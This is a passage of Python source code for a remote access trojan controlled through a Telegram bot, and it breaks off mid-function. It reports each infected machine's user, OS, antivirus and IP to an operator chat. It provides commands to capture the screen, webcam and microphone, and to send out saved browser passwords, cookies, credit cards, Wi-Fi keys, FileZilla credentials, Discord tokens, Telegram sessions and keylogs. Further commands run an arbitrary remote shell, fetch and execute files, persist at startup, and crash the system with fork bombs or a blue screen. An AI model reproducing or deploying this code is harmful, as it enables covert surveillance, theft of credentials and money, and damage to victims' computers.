		print('[+] › ' + "Unable to add to autorun" + InstallPath + ProcessName + '\n')


# Displays a message on the screen.

if DisplayMessageBox is True:

	if not os.path.exists(Directory + 'DisplayMessageBox'):
		open(Directory + 'DisplayMessageBox', 'a').close()
		MessageBox(Message)


# Protect process with BSoD (if killed).

# if ProcessBSODProtectionEnabled is True:

# 	if Admin() is False:
# 		print('[-] › This function requires admin rights\n')

# 	if Admin() is True:
# 		if platform.release() == '10':
# 			Thread(target=ProcessChecker).start()

# 		if platform.release() != '10':
# 			SetProtection()

# 		print('[+] › Process protection has been activated\n')


# Sends an online message

while True:
	try:

		if Admin() is True:
			Online = '🔘 Online!'

		if Admin() is False:
			Online = '🟢 Online!'

		bot.send_message(TelegramChatID, 
			'\n*' + Online + '\n'
			'\nPC » ' + os.getlogin() +
			'\nOS » ' + Windows() +
			'\n'
			'\nAV » ' + Antivirus[0] +
			'\n'
			'\nIP » ' + Geolocation('query') + '*',
				parse_mode='Markdown')

	except Exception as e:
		print('[-] › Retrying connect to api.telegram.org\n')
		print(e)

	else:
		print('[+] › Connected to api.telegram.org\n')
		break


# Takes a screenshot

@bot.message_handler(regexp='/Screen')
def Screen(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_photo')
		File = Directory + 'Screenshot.jpg'

		Screenshot(File)
		Screen = open(File, 'rb')

		bot.send_photo(command.chat.id, Screen)

	except:
		pass


# Takes a photo from a webcam

@bot.message_handler(regexp='/Webcam')
def Webcam(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_photo')
		File = Directory + 'Webcam.jpg'

		if os.path.exists(File):
			os.remove(File)

		WebcamScreenshot(File)
		Webcam = open(File, 'rb')

		bot.send_photo(command.chat.id, Webcam)

	except:
		bot.reply_to(command, '_Webcam not found._', parse_mode='Markdown')


# Records microphone sound

@bot.message_handler(regexp='/Audio')
def Audio(command):
	try:

		Seconds = re.split('/Audio ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '_Recording..._', parse_mode='Markdown')
		try:

			File = Directory + 'Audio.wav'

			Microphone(File, Seconds)
			Audio = open(File, 'rb')

			bot.send_voice(command.chat.id, Audio)

		except ValueError:
			bot.reply_to(command, '_Specify the recording time in seconds._', parse_mode='Markdown')

		except:
			bot.reply_to(command, '_Microphone not found._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Specify the recording duration_\n\n*› /Audio*', parse_mode='Markdown')


# Sends a message

def SendMessage(call, text):
	try:
		bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, parse_mode='Markdown')
	except:
		pass


# Power and startup management

@bot.callback_query_handler(func=lambda call: True)
def CallbackInline(command):
	if command.message:


		# Hibernate button

		if command.data == 'hibernate':
			SendMessage(command, '_Hibernate command received!_')
			# UnsetProtection()
			Hibernate()


		# Shutdown button

		if command.data == 'shutdown':
			SendMessage(command, '*Shutdown* command received!')
			# UnsetProtection()
			Shutdown()


		# Reboot button

		if command.data == 'restart':
			SendMessage(command, '*Restart* command received!')
			# UnsetProtection()
			Restart()


		# Button that ends a user session

		if command.data == 'logoff':
			SendMessage(command, '*Logoff* command received!')
			# UnsetProtection()
			Logoff()


		# Button killing system with blue screen of death

		if command.data == 'bsod':
			SendMessage(command, 'The *Blue Screen of Death* has been activated!')
			# UnsetProtection()
			BSoD()


		# Button processing which adds a trojan to startup (schtasks)

		if command.data == 'startup':
			check = autorun.become_persistent_on_windows()
			SendMessage(command, check)


			


		# Button processing that confirms the removal of a trojan

		if command.data == 'confirm':
			bot.edit_message_text(chat_id=command.message.chat.id,
				message_id=command.message.message_id, text='_Are you sure?_', reply_markup=main4, parse_mode='Markdown')


		# Handling the <<Uninstall>> Button

		if command.data == 'uninstall':
			SendMessage(command, '*' + CurrentName + '* has been uninstalled!')
			ans = autorun.uninstall()
			SendMessage(command, ans)



		# Handling the <<Kill All Processes>> Button

		if command.data == 'taskkill all':
			SendMessage(command, '_Terminating processes..._')
			TaskkillAll(CurrentName)
			SendMessage(command, '_All processes has been terminated!_')


		# Handling the <<Disable Task Manager>> Button

		# if command.data == 'disabletaskmgr':

		# 	if os.path.exists(Directory + 'RegeditDisableTaskManager'):
		# 		SendMessage(command, '*taskmgr.exe* is already disabled.')

		# 	else:

		# 		if Admin() is False:
		# 			SendMessage(command, '_This function requires admin rights._')

		# 		if Admin() is True:
		# 			RegeditDisableTaskManager()
		# 			open(Directory + 'RegeditDisableTaskManager', 'a').close()
		# 			SendMessage(command, '*taskmgr.exe* has been disabled!')


		# Handling the <<Back>> Button

		if command.data == 'cancel':
			SendMessage(command, '`...`')


# Browse and switch directories

@bot.message_handler(regexp='/CD')
def CD(command):
	try:

		Path = re.split('/CD ', command.text, flags=re.I)[1]
		os.chdir(Path)
		bot.send_message(command.chat.id, '_Directory Changed!_\n\n`' + os.getcwd() + '`', parse_mode='Markdown')

	except FileNotFoundError:
		bot.reply_to(command, '_Directory not found._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Current Directory_\n\n`' + os.getcwd() + '`\n\n_Username_\n\n`' + os.getlogin() + '`', parse_mode='Markdown')


# List of files from a directory

@bot.message_handler(regexp='/ls')
def ls(command):
	try:

		Dirs = '\n``'.join(os.listdir())
		bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n\n' + '`' + Dirs + '`', parse_mode='Markdown')

	except:
		try:

			Dirse = '\n'.join(os.listdir())
			SplittedText = telebot.util.split_string(Dirse, 4096)
			for Dirse in SplittedText:
				bot.send_message(command.chat.id, '`' + Dirse + '`', parse_mode='Markdown')

		except PermissionError:
				bot.reply_to(command, '_Permission denied._', parse_mode='Markdown')


# Deletes a user selected file

@bot.message_handler(commands=['Remove', 'remove'])
def Remove(command):
	try:

		File = re.split('/Remove ', command.text, flags=re.I)[1]
		Created = os.path.getctime(os.getcwd() + '\\' + File)
		Year, Month, Day, Hour, Minute, Second=time.localtime(Created)[:-3]

		def ConvertBytes(num):
			for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
				if num < 1024.0:
					return '%3.1f %s' % (num, x)
				num /= 1024.0

		def FileSize(FilePath):
			if os.path.isfile(FilePath):
				FileInfo = os.stat(FilePath)
				return ConvertBytes(FileInfo.st_size)

		bot.send_message(command.chat.id, 
			'File *' + File + '* removed!' 
			'\n' 
			'\n*Created* » `%02d/%02d/%d'%(Day, Month, Year) + '`' +
			'\n*Size* » `' + FileSize(os.getcwd() + '\\' + File) + '`',
				parse_mode='Markdown')

		os.remove(os.getcwd() + '\\' + File)

	except:
		try:

			File = re.split('/Remove ', command.text, flags=re.I)[1]
			Created = os.path.getctime(os.getcwd() + '\\' + File)
			Year, Month, Day, Hour, Minute, Second=time.localtime(Created)[:-3]
			Folder = os.getcwd() + '\\' + File
			FolderSize = 0

			for (Path, Dirs, Files) in os.walk(Folder):
				for iFile in Files:
					FileName = os.path.join(Path, iFile)
					FolderSize += os.path.getsize(FileName)
			Files = Folders = 0

			for _, DirNames, FileNames in os.walk(os.getcwd() + '\\' + File):
				Files += len(FileNames)
				Folders += len(DirNames)

			shutil.rmtree(os.getcwd() + '\\' + File)

			bot.send_message(command.chat.id, 
				'Folder *' + File + '* removed!'
				'\n'
				'\n*Created* » `%02d/%02d/%d'%(Day, Month, Year) + '`' +
				'\n*Size* » `%0.1f MB' % (FolderSize/(1024*1024.0)) + '`' +
				'\n*Contained* » `' + '{:,} Files, {:,} Folders'.format(Files, Folders) + '`',
					parse_mode='Markdown')

		except FileNotFoundError:
			bot.reply_to(command, '_File not found._', parse_mode='Markdown')

		except PermissionError:
			bot.reply_to(command, '_Permission denied._', parse_mode='Markdown')

		except:
			bot.send_message(command.chat.id, '_Enter a file name_\n\n*› /Remove • /RemoveAll*', parse_mode='Markdown')


# Deletes all files from the directory

@bot.message_handler(commands=['RemoveAll', 'removeall'])
def RemoveAll(command):
	try:

		bot.send_message(command.chat.id, '_Removing files..._', parse_mode='Markdown')

		FolderSize = 0
		for (Path, Dirs, Files) in os.walk(os.getcwd()):
			for File in Files:
				FileNames = os.path.join(Path, File)
				FolderSize += os.path.getsize(FileNames)
		Files = Folders = 0

		for _, DirNames, FileNames in os.walk(os.getcwd()):
			Files += len(FileNames)
			Folders += len(DirNames)
		list = os.listdir(os.getcwd())
		a = len(list)

		for FileNames in os.listdir(os.getcwd()):
			FilePath = os.path.join(os.getcwd(), FileNames)
			try:
				if os.path.isfile(FilePath) or os.path.islink(FilePath):
					os.unlink(FilePath)
				elif os.path.isdir(FilePath):
					shutil.rmtree(FilePath)
			except:
				pass

		list = os.listdir(os.getcwd())
		b = len(list)
		c = (a - b)

		bot.reply_to(command,
			'Removed *' + str(c) + '* files out of *' + str(a) + '!*'
			'\n'
			'\nSize » `%0.1f MB' % (FolderSize/(1024*1024.0)) + '`' +
			'\nContained » `' + '{:,} Files, {:,} Folders'.format(Files, Folders) + '`',
				parse_mode='Markdown')

	except:
		pass


# Upload a file to a connected computer (URL)

@bot.message_handler(regexp='/Upload')
def Upload(command):
	try:

		URL = re.split('/Upload ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '_Uploading file..._', parse_mode='Markdown')

		Filename = os.getcwd() + '\\' + os.path.basename(URL)
		r = urllib.request.urlretrieve(URL, Filename)

		bot.reply_to(command, '_File uploaded to computer!_\n\n`' + Filename + '`', parse_mode='Markdown')

	except ValueError:
		bot.reply_to(command, '_Insert a direct download link._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Send file or paste URL_\n\n*› /Upload*', parse_mode='Markdown')


# Download a file to a connected computer (Message)

@bot.message_handler(content_types=['document'])
def Document(command):
	try:

		File = bot.get_file(command.document.file_id)
		bot.send_message(command.chat.id, '_Uploading file..._', parse_mode='Markdown')
		DownloadedFile = bot.download_file(File.file_path)
		Source = Directory + File.file_path;
		with open(Source, 'wb') as NewFile:
			NewFile.write(DownloadedFile)

		Final = os.getcwd() + '\\' + Source.split(File.file_path)[1] + command.document.file_name
		shutil.move(Source, Final)
		bot.reply_to(command, '_File uploaded to computer!_\n\n`' + Final + '`', parse_mode='Markdown')

	except FileNotFoundError:
		bot.reply_to(command, '_File format is not supported._', parse_mode='Markdown')

	except OSError:
		bot.reply_to(command, '_Try saving the file in a different directory._', parse_mode='Markdown')

	except:
		bot.reply_to(command, '_You cannot upload a file larger than 20 MB._', parse_mode='Markdown')


# Download the file selected by the user

@bot.message_handler(regexp='/Download')
def Download(command):
	try:

		File = re.split('/Download ', command.text, flags=re.I)[1]
		Download = open(os.getcwd() + '\\' + File, 'rb')
		bot.send_message(command.chat.id, '_Sending file..._', parse_mode='Markdown')
		bot.send_document(command.chat.id, Download)

	except FileNotFoundError:
		bot.reply_to(command, '_File not found._', parse_mode='Markdown')

	except:
		try:

			File = re.split('/Download ', command.text, flags=re.I)[1]
			bot.send_message(command.chat.id, '_Archiving..._', parse_mode='Markdown')
			shutil.make_archive(Directory + File,
								'zip',
								os.getcwd() + '\\',
								File)
			iFile = open(Directory + File + '.zip', 'rb')
			bot.send_message(command.chat.id, '_Sending folder..._', parse_mode='Markdown')
			bot.send_document(command.chat.id, iFile)
			iFile.close()
			os.remove(Directory + File + '.zip')

		except PermissionError:
			bot.reply_to(command, '_Permission denied._', parse_mode='Markdown')

		except:
			try:

				iFile.close()
				os.remove(Directory + File + '.zip')
				bot.reply_to(command, '_You cannot download a file larger than 50 MB._', parse_mode='Markdown')

			except:
				bot.send_message(command.chat.id, '_Enter a file name_\n\n*› /Download*', parse_mode='Markdown')


# Runs the file selected by the user

@bot.message_handler(commands=['Run', 'run'])
def Run(command):
	try:

		File = re.split('/Run ', command.text, flags=re.I)[1]
		os.startfile(os.getcwd() + '\\' + File)
		bot.reply_to(command, 'File *' + File + '* has been running!', parse_mode='Markdown')

	except FileNotFoundError:
		bot.reply_to(command, '_File not found._', parse_mode='Markdown')

	except OSError:
		bot.reply_to(command, '_File isolated by the system and cannot be running._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Enter a file name_\n\n*› /Run • /RunAS*', parse_mode='Markdown')


# Runs the file selected by the user as administrator

@bot.message_handler(commands=['RunAS', 'runas'])
def RunAS(command):
	try:

		File = re.split('/RunAS ', command.text, flags=re.I)[1]
		os.startfile(os.getcwd() + '\\' + File, 'runas')
		bot.reply_to(command, 'File *' + File + '* has been running!', parse_mode='Markdown')

	except FileNotFoundError:
		bot.reply_to(command, '_File not found._', parse_mode='Markdown')

	except OSError:
		bot.reply_to(command, '_Acces denied._', parse_mode='Markdown')
	except:
		bot.send_message(command.chat.id, '_Enter a file name_\n\n*› /Run • /RunAS*', parse_mode='Markdown')


# Gets a list of active processes

@bot.message_handler(regexp='/Tasklist')
def Tasklist(command):
	bot.send_message(command.chat.id, '`' + ProcessList() + '`', parse_mode='Markdown')


# Kills the user selected process

@bot.message_handler(regexp='/Taskkill')
def Taskkill(command):
	try:

		Process = re.split('/Taskkill ', command.text, flags=re.I)[1]
		KillProcess(Process)

		if not Process.endswith('.exe'):
			Process = Process + '.exe'

		bot.reply_to(command, 'The process *' + Process + '* has been stopped!', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, 
			'_Enter process name_'
			'\n'
			'\n*› /Taskkill*'
			'\n'
			'\n_Active Window_'
			'\n'
			'\n`' + WindowTitle() + '`',
				reply_markup=main6, parse_mode='Markdown')


# Displays text sent by user

@bot.message_handler(regexp='/Message')
def Message(command):
	try:

		Message = re.split('/Message ', command.text, flags=re.I)[1]
		bot.reply_to(command, '_The message has been sended!_', parse_mode='Markdown')
		SendMessageBox(Message)

	except:
		bot.send_message(command.chat.id, '_Enter your message_\n\n*› /Message*', parse_mode='Markdown')


# Speak text

@bot.message_handler(regexp='/Speak')
def Speak(command):
	try:

		Text = re.split('/Speak ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '_Speaking..._', parse_mode='Markdown')
		try:
			Adds = ADDONS()
			msgToreturn = Adds.voice(Text)
			bot.reply_to(command, '_Successfully!_ \n'+msgToreturn, parse_mode='Markdown')
		except:
			bot.reply_to(command, '_Failed to speak text._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Enter your text_\n\n*› /Speak*', parse_mode='Markdown')


# Opens a link from a standard browser

@bot.message_handler(regexp='/OpenURL')
def OpenURL(command):
	try:

		URL = re.split('/OpenURL ', command.text, flags=re.I)[1]
		OpenBrowser(URL)
		bot.reply_to(command, '_The URL has been opened!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Enter your URL_\n\n*› /OpenURL*', parse_mode='Markdown')


# Sets the desktop wallpaper

@bot.message_handler(content_types=['photo'])
def Wallpapers(command):

	Photo = bot.get_file(command.photo[len(command.photo)-1].file_id)
	File = bot.get_file(command.photo[len(command.photo)-1].file_id)
	DownloadedFile = bot.download_file(File.file_path)
	Source = Directory + File.file_path;
	with open(Source, 'wb') as new_file:
		new_file.write(DownloadedFile)

	SetWallpapers(Photo, Directory)
	bot.reply_to(command, '_ The Photo has been set on the Wallpapers!_', parse_mode='Markdown')


# Infinite start CMD.exe

@bot.message_handler(regexp='/ForkBomb')
def ForkBomb(command):

	bot.send_message(command.chat.id, '_Preparing ForkBomb..._', parse_mode='Markdown')
	Forkbomb()


# Endless file creation

@bot.message_handler(regexp='/ZipBomb')
def ZipBomb(command):

	bot.send_message(command.chat.id, '_Preparing ZipBomb..._', parse_mode='Markdown')
	Zipbomb()


# Gets Wifi Password

@bot.message_handler(regexp='/WiFi')
def WiFi(command):
	try:

		bot.send_message(command.chat.id, 
			'_Received Wi-Fi Data_'
			'\n'
			'\n*SSID* » `' + StealWifiPasswords()['SSID'] + '`' +
			'\n*AUTH* » `' + StealWifiPasswords()['AUTH'] + '`' +
			'\n*Cipher* » `' + StealWifiPasswords()['Cipher'] + '`' + 
			'\n*Security Key* » `' + StealWifiPasswords()['SecurityKey'] + '`' +
			'\n*Password* » `' + StealWifiPasswords()['Password'] + '`',
				parse_mode='Markdown')

	except:
		bot.reply_to(command, '_Failed to authenticate Wi-Fi._', parse_mode='Markdown')


# Gets FileZilla Password 

@bot.message_handler(regexp='/FileZilla')
def FileZilla(command):
	try:

		bot.send_message(command.chat.id,
			'_Received FileZilla Data_'
			'\n'
			'\n*Hostname* » `' + StealFileZilla()['Hostname'] + '`' +
			'\n*Username* » `' + StealFileZilla()['Username'] + '`' +
			'\n*Password* » `' + StealFileZilla()['Password'] + '`',
				parse_mode='Markdown')

	except:
		bot.reply_to(command, '_FileZilla not installed._', parse_mode='Markdown')


# Gets Discord Token

@bot.message_handler(regexp='/Discord')
def Discord(command):
	try:

		bot.send_message(command.chat.id, '*Discord Token*\n\n`' + DiscordToken() + '`', parse_mode='Markdown')

	except:
		bot.reply_to(command, '_Discord not installed._', parse_mode='Markdown')


# Gets the user current telegram session

@bot.message_handler(regexp='/Telegram')
def Telegram(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		TelegramSession(Directory)
		Telegram = open(Directory + 'tdata.zip', 'rb')

		bot.send_document(command.chat.id, Telegram)

	except:
		bot.reply_to(command, '_Telegram not installed._', parse_mode='Markdown')


# Retrieves saved passwords from browsers (Opera, Chrome)

@bot.message_handler(regexp='/CreditCards')
def CreditCards(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'CreditCards.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedCreditCards())

		CreditCards = open(Directory + 'CreditCards.txt', 'rb')
		bot.send_document(command.chat.id, CreditCards)

	except:
		bot.reply_to(command, '_CreditCards not found._', parse_mode='Markdown')


# Retrieves saved passwords from browsers (Opera, Chrome)

@bot.message_handler(regexp='/Bookmarks')
def Bookmarks(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'Bookmarks.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedBookmarks())

		Bookmarks = open(Directory + 'Bookmarks.txt', 'rb')
		bot.send_document(command.chat.id, Bookmarks)

	except:
		bot.reply_to(command, '_Bookmarks not found._', parse_mode='Markdown')


# Retrieves saved passwords from browsers (Opera, Chrome)

@bot.message_handler(regexp='/Passwords')
def Passwords(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'Passwords.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedPasswords())

		Passwords = open(Directory + 'Passwords.txt', 'rb')
		bot.send_document(command.chat.id, Passwords)

	except:
		bot.reply_to(command, '_Passwords not found._', parse_mode='Markdown')


# Retrieves saved cookies from browsers (Opera, Chrome)

@bot.message_handler(regexp='/Cookies')
def Cookies(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'Cookies.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedCookies())

		Cookies = open(Directory + 'Cookies.txt', 'rb')
		bot.send_document(command.chat.id, Cookies)

	except:
		bot.reply_to(command, '_Cookies not found._', parse_mode='Markdown')


# Gets saved browser history (Opera, Chrome)

@bot.message_handler(regexp='/History')
def History(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'History.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedHistory())

		History = open(Directory + 'History.txt', 'rb')
		bot.send_document(command.chat.id, History)

	except:
		bot.reply_to(command, '_History not found._', parse_mode='Markdown')


# Editing and viewing the clipboard

@bot.message_handler(regexp='/Clipboard')
def Clipboard(command):
	try:

		Text = re.split('/Clipboard ', command.text, flags=re.I)[1]
		SetClipboard(Text)
		bot.reply_to(command, '_Clipboard contents changed!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id,
			'_Enter your text_'
			'\n'
			'\n*› /Clipboard*'
			'\n'
			'\n_Clipboard Content_'
			'\n'
			'\n`' + GetClipboard() + '`',
				parse_mode='Markdown')

# Receive Keylogs

@bot.message_handler(regexp='/Keylogger')
def Keylogger(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')
		Keylogs = open(os.getenv('Temp') + '\\Keylogs.txt', 'rb')
		bot.send_document(command.chat.id, Keylogs)

	except:
		bot.send_message(command.chat.id, '_No keylogs recorded._', parse_mode='Markdown')



# @bot.message_handler(regexp='/SendKeys')
# def SendKeys(command):
# 	try:

# 		Text = re.split('/SendKeys ', command.text, flags=re.I)[1]
# 		bot.send_message(command.chat.id, '_Sending keys..._', parse_mode='Markdown')
# 		SendKeyPress(Text)
# 		bot.reply_to(command, '_Text successfully typed!_', parse_mode='Markdown')

# 	except:
# 		bot.send_message(command.chat.id, '_Enter your text_\n\n*› /SendKeys*', parse_mode='Markdown')


# Display Rotate <0,90,180,270>

# @bot.message_handler(regexp='/Rotate')
# def Rotate(command):
# 	try:

# 		Position = re.split('/Rotate ', command.text, flags=re.I)[1]
# 		DisplayRotate(Degrees=Position)
# 		bot.reply_to(command, '_The Display has been rotated!_', parse_mode='Markdown')

# 	except:
# 		bot.send_message(command.chat.id,
# 			'_Select display rotation_'
# 			'\n'
# 			'\n*› /Rotate*'
# 			'\n'
# 			'\n_Provisions_'
# 			'\n'
# 			'\n`0` / `90` / `180` / `270`',
# 				parse_mode='Markdown')


# Audio volume control

@bot.message_handler(regexp='/Volume')
def Volume(command):
	try:

		Level = re.split('/Volume ', command.text, flags=re.I)[1]
		VolumeControl(Level)
		bot.send_message(command.chat.id, '_Audio volume set to_ *' + Level + '* _level!_', parse_mode='Markdown')

	except ValueError:
		bot.send_message(command.chat.id, '_Specify the volume level in numbers_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Specify the audio volume_\n\n*› /Volume*', parse_mode='Markdown')


# # Monitor <on/off>

# @bot.message_handler(regexp='/Monitor')
# def Monitor(command):
# 	try:

# 		Monitor = re.split('/Monitor ', command.text, flags=re.I)[1]

# 		if Monitor.lower() == 'Off'.lower():
# 			Off()
# 			bot.reply_to(command, '_The Monitor has been Off_', parse_mode='Markdown')

# 		if Monitor.lower() == 'On'.lower():
# 			On()
# 			bot.reply_to(command, '_The Monitor has been On_', parse_mode='Markdown')

# 	except:
# 		bot.send_message(command.chat.id, 
# 			'_Select monitor mode_'
# 			'\n'
# 			'\n*› /Monitor*'
# 			'\n'
# 			'\n_Modes_'
# 			'\n'
# 			'\n`On` / `Off`',
# 				parse_mode='Markdown')

# Lock input (keyboard and mouse) for the selected number of seconds


# @bot.message_handler(regexp='/Freeze')
# def Freeze(command):

# 	if Admin() is False:
# 		bot.send_message(command.chat.id, '_This function requires admin rights._', parse_mode='Markdown')

# 	if Admin() is True:
# 		try:

# 			Seconds = re.split('/Freeze ', command.text, flags=re.I)[1]
# 			bot.send_message(command.chat.id, '_Keyboard and mouse locked for_ *' + Seconds + '* _seconds!_', parse_mode='Markdown')
# 			Block(float(Seconds))
# 			bot.reply_to(command, '_Keyboard and mouse are now unlocked!_', parse_mode='Markdown')

# 		except ValueError:
# 			bot.reply_to(command, '_Specify the duration of the lock in seconds._', parse_mode='Markdown')

# 		except:
# 			bot.send_message(command.chat.id, '_Specify the duration of the lock_\n\n*› /Freeze*', parse_mode='Markdown')


# ADVANCE INFO

@bot.message_handler(regexp='/advanceinfo')
def advanceinfo(command):
	try:
		adds = ADDONS()
		info = adds.info()
		bot.send_chat_action(command.chat.id, 'upload_document')
		
		infotxt = open(os.getenv('Temp') + '\\info.txt', 'w')
		infotxt.write(info)
		infotxt.close()
		tosendtxt = open(os.getenv('Temp') + '\\info.txt', 'r')
		bot.send_document(command.chat.id, tosendtxt)
		os.remove(os.getenv('Temp') + '\\info.txt')

	except:
		bot.send_message(command.chat.id, 'sorry unable to send advance info ',parse_mode='Markdown')


# Remote command execution (CMD)

@bot.message_handler(regexp='/CMD')
def CMD(command):
	try:

		Command = re.split('/CMD ', command.text, flags=re.I)[1]
		CMD = subprocess.Popen(Command,
			shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

		Lines = []
		for Line in CMD.stdout.readlines():
			Line = Line.strip()
			if Line:
				Lines.append(Line.decode('cp866'))
				Output = '\n'.join(Lines)

		bot.send_message(command.chat.id, Output)

	except:
		try:

			Command = re.split('/CMD ', command.text, flags=re.I)[1]
			SplittedText = telebot.util.split_string(Output, 4096)
			for Output in SplittedText:

				bot.send_message(command.chat.id, Output)

		except UnboundLocalError:
			bot.reply_to(command, '_Command completed!_', parse_mode='Markdown')

		except:
			bot.send_message(command.chat.id, '_Enter your command_\n\n*› /CMD*', parse_mode='Markdown')


# Remote command execution (BAT)

@bot.message_handler(regexp='/BAT')
def BAT(command):
	try:

		Command = re.split('/BAT ', command.text, flags=re.I)[1]	
		File = Directory + 'Command.bat'
		BatchFile = open(File, 'w').write(Command)
	
		if Admin() is False:
			os.startfile(File)
	
		if Admin() is True:
			os.startfile(File, 'runas')

		bot.reply_to(command, '_Command completed!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Enter your command_\n\n*› /BAT*', parse_mode='Markdown')


# Getting location by BSSID

@bot.message_handler(regexp='/Location')
def Location(command):
	try:

		bot.send_chat_action(command.chat.id, 'find_location')
		Coordinates = GetLocationByBSSID(GetMacByIP())
		Latitude = Coordinates['lat']
		Longitude = Coordinates['lon']
		bot.send_location(command.chat.id, Latitude, Longitude)
		bot.send_message(command.chat.id,
			'_Location_'
			'\n'
			'\n*IP Address* » `' + Geolocation('query') + '`' +
			'\n*Country* » `' + Geolocation('country') + '`' +
			'\n*City* » `' + Geolocation('city') + '`' +
			'\n'
			'\n*Latitude* » `' + str(Coordinates['lat']) + '`' +
			'\n*Longitude* » `' + str(Coordinates['lon']) + '`' +
			'\n*Range* » `' + str(Coordinates['range']) + '`' +
			'\n'
			'\n*BSSID* » `' + GetMacByIP() + '`',
				parse_mode='Markdown') 

	except:
		bot.send_message(command.chat.id,
			'_Failed locate target by BSSID_'
			'\n'
			'\n*IP Address* » `' + Geolocation('query') + '`' +
			'\n*Country* » `' + Geolocation('country') + '`' +
			'\n*City* » `' + Geolocation('city') + '`' +
			'\n'
			'\n*BSSID* » `' + GetMacByIP() + '`',
				parse_mode='Markdown') 


# System Information

@bot.message_handler(regexp='/Info')
def Info(command):
	try:

		bot.send_chat_action(command.chat.id, 'typing')
		bot.send_message(command.chat.id, 
			'\n_Computer Info_'
			'\n'
			'\n*System Version* » `' + Windows() + '`' +
			'\n*Computer Name* » `' + str(Computer('ComputerSystem', 'Name')) + '`' +
			'\n*Computer Model* » `' + str(Computer('ComputerSystem', 'Model')) + '`' +
			'\n*Manufacturer* » `' + str(Computer('ComputerSystem', 'Manufacturer')) + '`' +
			'\n*System Time* » `' + SystemTime() + '`' +
			'\n*Username* » `' + os.getlogin() + '`' +
			'\n'
			'\n'
			'\n_Hardware_'
			'\n'
			'\n*CPU* » `' + str(Computer('CPU', 'Name')) + '`' +
			'\n*GPU* » `' + str(Computer('path Win32_VideoController', 'Name')) + '`' +
			'\n*RAM* » `' + str(RAM()) + '`' +
			'\n*ARM* » `' + platform.architecture()[0] + '`' +
			'\n'
			'\n'
			'\n_Protection_'
			'\n'
			'\n*Started as Admin* » `' + str(Admin())+ '`' +
			'\n*Process Protected* » `' + str(ProcessBSODProtectionEnabled) + '`' +
			'\n*Installed Antivirus* » `' + Antivirus[0] + '`',
				parse_mode='Markdown')

	except:
		pass


# Command handler / help

@bot.message_handler(commands=['Help', 'help'])
def Help(command):
	bot.send_message(command.chat.id,
		'ᅠᅠᅠᅠ ⚙️ *Commands* ⚙️'
		'\n'
		'\n'
		'\n*/Info* - _System Information_'
		'\n*/advanceinfo* - _Advance System Information_'
		'\n*/Location* - _Location by BSSID_'
		'\n'
		'\n*/Screen* -  _Desktop Capture_'
		'\n*/Webcam* - _Webcam Capture_'
		'\n*/Audio* - _Sound Capture_'
		'\n*/Power* - _Computer Power_'
		'\n*/Autorun* - _Startup Management_'
		'\n'
		'\n*/Files* - _Files Manager_'
		'\n› */CD* - _Change Directory_'
		'\n› */ls* - _List of Files_'
		'\n› */Remove* - _Remove a File_'
		'\n› */Upload* - _Upload File_'
		'\n› */Download* - _Download File_'
		'\n› */Run* - _Run File_'
		'\n*/Tasklist* - _Process list_'
		'\n*/Taskkill* - _Process Kill_'
		'\n'
		'\n*/Message* - _Send Message_'
		'\n*/Speak* - _Speak Message_'
		'\n*/OpenURL* - _Open URL_'
		'\n*/Wallpapers* - _Set Wallpapers_'
		'\n'
		'\n*/WiFi* - _Wi-Fi Data_'
		'\n*/FileZilla* - _FTP Client_'
		'\n*/Discord* - _Discord Token_'
		'\n*/Telegram* - _Telegram Session_'
		'\n*/CreditCards* - _Get CreditCards_'
		'\n*/Bookmarks* - _Get Bookmarks_'
		'\n*/Passwords* - _Get Passwords_'
		'\n*/Cookies* - _Get Cookies_'
		'\n*/History* - _Get History_'
		'\n'
		'\n*/ZipBomb* - _Memory Overflow_'
		'\n*/ForkBomb* - _Launch Programs_'
		'\n'
		'\n*/Clipboard* - _Clipboard Editing_'
		'\n*/Keylogger* - _Receive Keylogs_'
		'\n*/Volume* - _Volume Control_'
		'\n'
		'\n*/CMD* - _Remote Shell_'
		'\n*/BAT* - _Batch Scripting_'
		'\n'
		'\n',
		#'\n*Coded by Bainky | @bainki 👾*', 
			reply_markup=menu, parse_mode='Markdown')


# Navigation buttons

@bot.message_handler(commands=['3', '6'])
def Main(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode='Markdown')

@bot.message_handler(commands=['2', '5'])
def Main(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode='Markdown')

@bot.message_handler(commands=['4', '1'])
def Main(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode='Markdown')

@bot.message_handler(commands=['Power', 'power'])
def Power(command):
